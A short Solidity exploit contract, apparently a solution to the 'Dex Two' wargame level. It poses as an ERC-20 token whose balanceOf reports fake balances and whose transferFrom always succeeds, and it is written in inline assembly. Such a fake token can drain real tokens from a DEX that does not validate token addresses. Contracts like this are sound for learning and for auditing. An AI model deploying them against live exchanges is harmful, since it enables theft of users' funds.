// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract DexTwoExploit {
    address player;

    constructor() {
        // player = msg.sender;
        assembly {
            sstore(player.slot, caller())
        }
    }

    function balanceOf(address account) external view returns (uint256) {
        // return account == player ? 1000 : 1;
        assembly {
            switch eq(account, sload(player.slot))
            case 0 {
                mstore(0, 1)
            }
            case 1 {
                mstore(0, 1000)
            }
            return(0, 0x20)
        }
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        // return true;
        assembly {
            mstore(0, true)
            return(0, 0x20)
        }
    }
}
